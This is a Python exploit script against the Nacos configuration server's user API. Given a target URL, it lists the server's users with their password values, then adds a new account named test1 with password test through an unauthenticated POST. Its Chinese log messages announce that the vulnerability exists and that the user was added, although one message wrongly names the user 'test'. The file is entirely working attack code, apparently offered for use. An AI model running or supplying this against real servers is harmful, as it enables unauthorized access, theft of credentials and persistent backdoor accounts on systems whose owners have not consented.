#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import sys
import logging
import requests
import coloredlogs as coloredlogs
coloredlogs.install(level="INFO", fmt='%(asctime)s [%(levelname)s] %(message)s',level_styles={
        'info': {'color': 'white', 'bold': False},
        'warn': {'color': 'green', 'bold': True},
        'error': {'color': 'magenta', 'bold': False}},isatty=True)

def search():
    input = sys.argv[1]
    add_user = input + '/nacos/v1/auth/users?username=test1&password=test'
    check_user = input + '/nacos/v1/auth/users?pageNo=1&pageSize=100'
    response = requests.get(check_user)
    if response.status_code == 200 and ("totalCount" in response.text and "pageNumber" in response.text and "pagesAvailable" in response.text):
        pageItems = response.json().get('pageItems',[])
        logging.info('该地址存在漏洞,已知用户名密码：')
        for i in pageItems:
            print('usrname:'+i.get('username'),'password:'+i.get('password'))
    else:
        logging.warning('漏洞不存在')
        exit()
    logging.warning('正在尝试增加新用户默认用户名为test,密码为test')
    header = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    }
    req_post = requests.post(add_user,headers=header)
    logging.info('添加用户成功')
if __name__ == '__main__':
    search()